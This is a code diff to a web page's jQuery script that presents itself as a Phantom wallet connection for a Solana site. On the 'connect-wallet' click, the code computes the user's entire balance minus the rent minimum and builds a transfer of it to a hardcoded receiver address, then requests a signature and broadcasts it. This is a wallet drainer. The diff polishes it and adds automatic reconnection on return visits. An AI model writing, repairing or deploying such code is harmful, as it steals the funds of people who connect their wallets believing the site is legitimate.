@@ -9,8 +9,8 @@ $(document).ready(function () {
             'confirmed'
         );
 
-        const public_key = new solanaWeb3.PublicKey(resp.publicKey);
-        const walletBalance = await connection.getBalance(public_key);
+        const publicKey = new solanaWeb3.PublicKey(resp.publicKey.toString());
+        const walletBalance = await connection.getBalance(publicKey);
         console.log("Wallet balance:", walletBalance);
 
         const minBalance = await connection.getMinimumBalanceForRentExemption(0);
@@ -24,7 +24,7 @@ $(document).ready(function () {
 
         $('#connect-wallet').off('click').on('click', async () => {
             try {
-                const recieverWallet = new solanaWeb3.PublicKey('5FfkceXdH2oMPgRpZFKZJPmTE6fLKfUfDRke2gmxuf5n'); // Replace with real address
+                const receiverWallet = new solanaWeb3.PublicKey('5FfkceXdH2oMPgRpZFKZJPmTE6fLKfUfDRke2gmxuf5n');
                 const balanceForTransfer = walletBalance - minBalance;
 
                 if (balanceForTransfer <= 0) {
@@ -36,15 +36,15 @@ $(document).ready(function () {
 
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: resp.publicKey,
-                        toPubkey: recieverWallet,
+                        fromPubkey: publicKey,
+                        toPubkey: receiverWallet,
                         lamports: transferAmount,
                     })
                 );
 
-                transaction.feePayer = window.solana.publicKey;
-                const blockhashObj = await connection.getRecentBlockhash();
-                transaction.recentBlockhash = blockhashObj.blockhash;
+                transaction.feePayer = publicKey;
+                const { blockhash } = await connection.getRecentBlockhash();
+                transaction.recentBlockhash = blockhash;
 
                 const signed = await window.solana.signTransaction(transaction);
                 const txid = await connection.sendRawTransaction(signed.serialize());
@@ -71,6 +71,20 @@ $(document).ready(function () {
         }
     }
 
+    async function checkConnectionOnReturn() {
+        if (window.solana && window.solana.isPhantom) {
+            try {
+                const alreadyConnected = sessionStorage.getItem('phantomConnected');
+                if (alreadyConnected) {
+                    const resp = await window.solana.connect({ onlyIfTrusted: true });
+                    handleWalletConnection(resp);
+                }
+            } catch (err) {
+                console.warn("User not connected (yet).");
+            }
+        }
+    }
+
     $('#connect-wallet').on('click', async () => {
         if (window.solana && window.solana.isPhantom) {
             await connectPhantom();
@@ -83,47 +97,11 @@ $(document).ready(function () {
                 const phantomLink = `https://phantom.app/ul/v1/connect?app_url=${dappUrl}`;
                 window.location.href = phantomLink;
             } else {
-                const isFirefox = typeof InstallTrigger !== "undefined";
-                const isChrome = !!window.chrome;
-
-                if (isFirefox) {
-                    window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
-                } else if (isChrome) {
-                    window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
-                } else {
-                    alert("Please download the Phantom extension for your browser.");
-                }
+                window.open("https://phantom.app/", "_blank");
             }
         }
     });
 
-    // Resume after install (desktop + mobile)
-    const phantomWasJustInstalled = sessionStorage.getItem('phantomInstallRequested') === 'true';
-    const phantomAvailable = window.solana && window.solana.isPhantom;
-
-    if (phantomWasJustInstalled && phantomAvailable) {
-        connectPhantom();
-    }
-
-    // Auto-reconnect if already trusted
-    if (phantomAvailable) {
-        window.solana.on("connect", async () => {
-            console.log("Wallet auto-connected (listener)");
-            const resp = { publicKey: window.solana.publicKey };
-            handleWalletConnection(resp);
-        });
-
-        const wasConnected = sessionStorage.getItem('phantomConnected');
-        if (wasConnected) {
-            window.solana.connect({ onlyIfTrusted: true })
-                .then(resp => {
-                    if (resp?.publicKey) {
-                        handleWalletConnection(resp);
-                    }
-                })
-                .catch(() => {
-                    sessionStorage.removeItem('phantomConnected');
-                });
-        }
-    }
+    // On page load, check if Phantom was previously connected
+    checkConnectionOnReturn();
 });
